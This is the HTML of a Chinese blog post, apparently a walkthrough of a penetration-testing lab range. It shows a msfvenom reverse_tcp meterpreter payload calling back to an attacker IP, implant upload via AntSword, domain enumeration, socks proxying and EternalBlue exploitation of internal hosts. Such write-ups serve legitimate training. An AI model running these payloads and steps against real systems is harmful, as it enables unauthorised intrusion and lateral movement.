+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202905547.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202910685.png"></p>
+<p>生成CS木马程序</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202917199.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202921411.png"></p>
+<p>通过蚁剑上传木马程序</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202927417.png"></p>
+<p>上线主机</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202934335.png"></p>
+<h1 id="渗透阶段">渗透阶段</h1>
+<p>利用msf反弹shell，建立与攻击机的链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.1.129 LPORT=1235 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202951873.png"></p>
+<p>通过蚁剑，将木马放到目标主机上</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203004425.png"></p>
+<p>Kali利用msf开启监听端口（use exploit/multi/handler）</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203011138.png"></p>
+<p>设置好对应参数，直接run</p>
+<p>发现链接不上，重新设置payload</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203018124.png"></p>
+<p>设置新的payload（set payload windows/meterpreter/reverse_tcp）</p>
+<p>Run一下就能连上了</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203027552.png"></p>
+<p>chcp 65001解决乱码</p>
+<p>查看目标主机网卡信息，获取内网ip：192.168.52.143</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203034925.png"></p>
+<h1 id="靶机信息收集">靶机信息收集</h1>
+<p>查看域内所有用户列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203054306.png"></p>
+<p>查看域成员计算机列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group “domain computers” /domain</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203113137.png"></p>
+<p>查看域管理员用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group “domain admins” /domain</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203125769.png"></p>
+<p>查看防火墙信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203139294.png"></p>
+<p>提权到system</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203145752.png"></p>
+<h1 id="域内横向渗透">域内横向渗透</h1>
+<p>用msf直接搭建sock隧道</p>
+<p>设置路由信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203209988.png"></p>
+<p>查看路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203219684.png"></p>
+<p>退到上层，使用socks4a进行代理</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203226701.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203230196.png"></p>
+<p>配置proxychains，保持和socks4a一致</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203236885.png"></p>
+<p>配置成功，界面如下</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203244553.png"></p>
+<h1 id="内网信息收集">内网信息收集</h1>
+<p>切换session，进入之前的session</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203257153.png"></p>
+<p>先利用msf得到的shell，观察内网存活主机个数</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203303867.png"></p>
+<p>一台存活主机为192.168.52.138，另一台存活主机为192.168.52.141</p>
+<p>对两台主机进行扫描，使用一些常见漏洞端口</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203320821.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203323555.png"></p>
+<p>发现主机192.168.52.138开启了445端口，可能存在永恒之蓝漏洞</p>
+<p>然后测试192.168.52.141，同样开放了445端口</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203329816.png"></p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<p>确定是否存在永恒之蓝漏洞</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203342288.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203345168.png"></p>
+<p>发现都存在永恒之蓝漏洞</p>
+<p>尝试攻击执行rce</p>
+<p>192.168.52.138执行whoami</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203352266.png"></p>
+<p>192.168.52.141执行whoami</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203359210.png"></p>
+<h1 id="存在的问题及解决办法">存在的问题及解决办法</h1>
+<p>msf生成的payload需要设为为32位，否则链接不稳定，没有办法getsystem</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203422827.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203425295.png"></p>
+<p>msf使用监听模块时，也需要将监听模块的payload设置和木马生成payload一致，否则会连接不上</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203433381.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203436195.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/12/22/%E6%B8%97%E9%80%8FDC-8/" rel="prev" title="渗透DC-8">
+      <i class="fa fa-chevron-left"></i> 渗透DC-8
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">网络配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">信息收集过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">漏洞发现过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8cs%E4%B8%8A%E7%BA%BF%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA"><span class="nav-number">4.</span> <span class="nav-text">使用CS上线目标靶机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="nav-number">5.</span> <span class="nav-text">渗透阶段</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">6.</span> <span class="nav-text">靶机信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">7.</span> <span class="nav-text">域内横向渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">8.</span> <span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">9.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95"><span class="nav-number">10.</span> <span class="nav-text">存在的问题及解决办法</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zzZxby"
+      src="/images/zzZ.jpg">
+  <p class="site-author-name" itemprop="name">zzZxby</p>
+  <div class="site-description" itemprop="description">看山是山，看水是水</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zzZxby</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">48k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:56</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    // window.MathJax = {
+    //   loader: {
+    //
+    //       load: ['[tex]/mhchem'],
+    //
+    //     source: {
+    //       '[tex]/amsCd': '[tex]/amscd',
+    //       '[tex]/AMScd': '[tex]/amscd'
+    //     }
+    //   },
+    //   tex: {
+    //     inlineMath: {'[+]': [['$', '$']]},
+    //
+    //       packages: {'[+]': ['mhchem']},
+    //
+    //     tags: 'ams'
+    //   },
+    //   options: {
+    //     renderActions: {
+    //       findScript: [10, doc => {
+    //         document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+    //           const display = !!node.type.match(/; *mode=display/);
+    //           const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+    //           const text = document.createTextNode('');
+    //           node.parentNode.replaceChild(text, node);
+    //           math.start = {node: text, delim: '', n: 0};
+    //           math.end = {node: text, delim: '', n: 0};
+    //           doc.math.push(math);
+    //         });
+    //       }, '', false],
+    //       insertedScript: [200, () => {
+    //         document.querySelectorAll('mjx-container').forEach(node => {
+    //           let target = node.parentNode;
+    //           if (target.nodeName.toLowerCase() === 'li') {
+    //             target.parentNode.classList.add('has-jax');
+    //           }
+    //         });
+    //       }, '', false]
+    //     }
+    //   }
+    // };
+    window.MathJax = {
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+        processEscapes: true
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+    </div>
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+
+</body>
+</html>
